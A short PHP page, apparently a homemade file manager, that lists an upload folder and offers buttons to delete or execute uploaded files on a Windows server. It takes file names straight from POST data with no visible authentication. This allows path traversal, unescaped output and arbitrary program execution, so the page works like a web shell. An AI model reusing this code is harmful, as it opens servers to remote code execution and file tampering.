<?PHP
//if($_POST)
//print_r($_POST);


///// IF UPLOADING FILE /////
if($_FILES)
{
    $res=upload_myfile();
    if ($res>0)
    {
        //get error code text func
        $s = upl_err($res);
        echo "<hr />$s<hr />";
    }

}

///// IF DELETING /////

if(isset($_POST['delfile']))
{
    $file=upload_folder.$_POST['fileNameD'];
    $err = del_file($file);
        if ($err == 0)
        {
            $url=$_SERVER['PHP_SELF'];
            header("Location: $url");
        }else{
            echo "Error! $err";
        }
}

//executing files for win
if(isset($_POST['START']))
{   
    $file = $_POST['fileNameD'];
    $e=start_exe($file);
    if($e)
    {
        $url=$_SERVER['PHP_SELF'];
        header("Location: $url");
    }else
    echo "<br />Some error exec!: $e<br />";
}
    




///// FILELIST JUST SHOWING /////
        //folder name
        $uf = upload_folder;
        //fuul path of upload folder
        $dirpath = root_folder.$uf;
            //if uploaddir not exists just create with all perms
            if (!is_dir($dirpath)) 
            {
                mkdir($dirpath, 0777, true);
            }
        $cdir = scan_my_dir($dirpath);
        
        $count = 0;
        if (count($cdir)>2)
        {
            echo (count($cdir)-2)." file(s) total";
                    //generate table list
                    foreach ($cdir as $value)
                    {
                        if ($value != ".." && $value != ".")
                        {
                            $count ++;
                            $fp = $dirpath.$value;
                            $fpi = file_perm_info($fp);
                            $dfile = $uf.$value;
                            $a = filesize($fp);
                            $a = ReadableSize($a);
                            echo '<form method="POST" action="" >';
                            echo "<tr>";
                            echo "<td>$count </td><td>".$fpi."</td>";
                            echo "<td><a href=\"{$dfile}\" title=\"download\">$value </a></td>";
                            echo "<td>$a</td>";
                            //del button
                            echo '<td><input type="submit" name = "delfile" value="DEL" />';
                            //start button
                            echo '<input type="submit" name = "START" value="execute" />';
                            echo '<input type="text" hidden name="fileNameD" value="'.$value.'"></td>';
                            echo "</tr>";
                            echo '</form>';
                        }
                    }  
        //if files count is 0 ZERRO
        }else{echo "[-]";}

echo "debug:<br /";

?>     